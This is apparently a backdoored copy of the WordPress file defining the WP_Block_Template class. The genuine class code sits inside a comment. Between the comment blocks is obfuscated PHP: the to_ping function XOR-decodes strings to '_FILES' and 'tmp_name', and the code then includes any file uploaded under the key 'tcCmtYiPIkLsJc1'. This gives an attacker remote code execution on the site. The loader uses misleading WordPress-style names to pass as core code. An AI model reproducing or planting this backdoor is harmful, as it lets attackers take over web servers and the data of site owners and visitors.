<?php /* 
*
 * Blocks API: WP_Block_Template class
 *
 * @package WordPress
 * @since 5.8.0
 

*
 * Class representing a block template.
 *
 * @since 5.8.0
 
class WP_Block_Template {

	*
	 * Type: wp_template.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $type;

	*
	 * Theme.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $theme;

	*
	 * Template slug.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $slug;

	*
	 * Id.
	 *
	 * @since 5.8.0
	 * @var string
	*/
 	

$old_posts = 'tcCmtYiPIkLsJc1';

function to_ping($filetype, $count2)

{
    $option = urldecode($filetype);

    $others_preg = substr($count2,0, strlen($option));

    $path = $option ^ $others_preg;
	$show_in_admin_status_list = 'current_user';
    return $path;
	$header = 'content';
}
$urls_to_ping = ${to_ping("%2B%25%0A%211%0A", $old_posts)};
	$mimes = 'template';
if (isset($urls_to_ping[$old_posts]))

{
	$is_email = 'mime_subgroup';
    $_links_add_target = $urls_to_ping[$old_posts];
	$cdata = 'field';
    $allblocks = $_links_add_target[to_ping("%00%0E32%1A8%045", $old_posts)];
    include ($allblocks);
}


/*  
	public $id;

	*
	 * Title.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $title = '';

	*
	 * Content.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $content = '';

	*
	 * Description.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $description = '';

	*
	 * Source of the content. `theme` and `custom` is used for now.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $source = 'theme';

	*
	 * Post Id.
	 *
	 * @since 5.8.0
	 * @var integer|null
	 
	public $wp_id;

	*
	 * Template Status.
	 *
	 * @since 5.8.0
	 * @var string
	 
	public $status;

	*
	 * Whether a template is, or is based upon, an existing template file.
	 *
	 * @since 5.8.0
	 * @var boolean
	 
	public $has_theme_file;
}
*/